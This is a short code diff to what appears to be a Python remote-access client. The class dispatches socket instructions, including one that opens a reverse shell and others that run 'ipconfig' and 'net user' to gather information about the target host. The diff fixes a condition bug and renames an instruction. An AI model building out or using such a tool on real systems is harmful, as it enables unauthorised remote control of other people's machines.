@@ -113,9 +113,9 @@ class Target(Machine):
                 self.reverse_shell_target()
             elif instruction == "getinfo_generality":
                 self.getinfo_target_generality()
-            elif instruction == "ipconfig" or "net user":
+            elif instruction == "ipconfig" or instruction == "net user":
                 self.getinfo_target_cmd(instruction)
-            elif instruction == "size_buffer":
+            elif instruction == "buffer_size":
                 self.buffer = int(self.s.recv(self.buffer))
                 if self.print:
                     print("the buffer size is %d now", self.buffer)
